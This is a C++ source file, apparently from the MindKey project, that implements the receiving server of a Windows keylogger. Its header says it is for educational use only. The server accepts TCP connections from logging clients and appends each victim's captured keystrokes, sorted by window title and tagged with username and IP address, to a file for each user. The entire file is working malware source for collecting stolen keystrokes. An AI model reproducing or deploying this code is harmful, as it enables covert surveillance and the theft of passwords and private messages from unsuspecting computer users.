/* MindKey, Keylogger for Windows.
* While this program can potentially be used for nefarious purposes,
* it was written for educational and recreational purposes only
* and the author does not endorse illegal use.
*
* Copyright (C) 2013 - 2014 Blackhack <https://github.com/blackhack/MindKey/>
*
* This program is free software: you can redistribute it and/or modify
* it under the terms of the GNU General Public License as published by
* the Free Software Foundation, either version 3 of the License, or
* (at your option) any later version.
*
* This program is distributed in the hope that it will be useful,
* but WITHOUT ANY WARRANTY; without even the implied warranty of
* MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
* GNU General Public License for more details.
*
* You should have received a copy of the GNU General Public License
* along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/

#include "common.hpp"
#include "MindServer.h"
#include <array>

MindServer::MindServer(boost::asio::io_service& io_service, unsigned short port)
: _acceptor(io_service, boost::asio::ip::tcp::endpoint(boost::asio::ip::tcp::v4(), port))
{
    std::cout << TimeStamp() << "> " << "Listening...\n";
    ConnectionPtr newConn = std::make_shared<connection>(_acceptor.get_io_service());

    _acceptor.async_accept(newConn->socket(), boost::bind(&MindServer::HandleAccept, this, boost::asio::placeholders::error, newConn));
};

MindServer::~MindServer()
{
}

void MindServer::HandleAccept(const boost::system::error_code& e, ConnectionPtr conn)
{
    if (!e)
        conn->async_read(_receivedData, boost::bind(&MindServer::HandleRead, this, boost::asio::placeholders::error, conn));
    else
        std::cerr << TimeStamp() << "> " << "Exeption Acceptor: " << e.message().c_str() << std::endl;

    ConnectionPtr new_conn(new connection(_acceptor.get_io_service()));
    _acceptor.async_accept(new_conn->socket(), boost::bind(&MindServer::HandleAccept, this, boost::asio::placeholders::error, new_conn));
}

void MindServer::HandleRead(const boost::system::error_code& e, ConnectionPtr conn)
{
    if (!e)
    {
        std::cout << TimeStamp() << "> " << "Update from IP: " << conn->socket().remote_endpoint().address().to_string().c_str() << ", Size: " << _receivedData.size() << "\n";
        SaveData(conn);
    }
    else
        std::cerr << TimeStamp() << "> " << "Exeption Read: " << e.message().c_str() << std::endl;
}

// Only allow filename with ascii chars.
void checkFileName(std::string &str)
{
    for (std::string::size_type i = 0; i < str.size(); ++i)
    {
        if (str[i] > char(127))
            str[i] = char(95);
    }
}

void MindServer::SaveData(ConnectionPtr conn)
{
    if (_receivedData.size() <= 0)
        return;

    std::string fileName = _receivedData[0].User + ".txt";
    checkFileName(fileName);

    std::cout << "Update file: " << fileName.c_str() << "\n";

    std::ofstream myfile;
    myfile.open(fileName.c_str(), std::ios::out | std::ios::app);

    std::string lastWindowTitle = _receivedData[0].WindowTitle;

    myfile << "----- BEGIN DATA, DATE: " << TimeStamp() << " -----\n";
    myfile << "From: " << conn->socket().remote_endpoint().address().to_string() << "\n";
    myfile << "Title: " << _receivedData[0].WindowTitle << "\n";
    myfile << "Data: ";

    for (auto &receivedData : _receivedData)
    {
        if (receivedData.WindowTitle == lastWindowTitle)
            myfile << receivedData.Key;
        else
        {
            myfile << "\n----------\n";
            myfile << "Title: " << receivedData.WindowTitle << "\n";
            myfile << "Data: ";
            lastWindowTitle = receivedData.WindowTitle;
        }
    }
    myfile << "\n----- END DATA -----\n\n";

    myfile.close();
}

std::string MindServer::TimeStamp()
{
    std::array<char, 64> buffer;
    buffer.fill(0);
    time_t rawtime = time(nullptr);
    auto timeinfo = localtime(&rawtime);
    strftime(buffer.data(), sizeof(buffer), "%Y-%m-%d %H-%M-%S", timeinfo);
    return std::string(buffer.data());

}
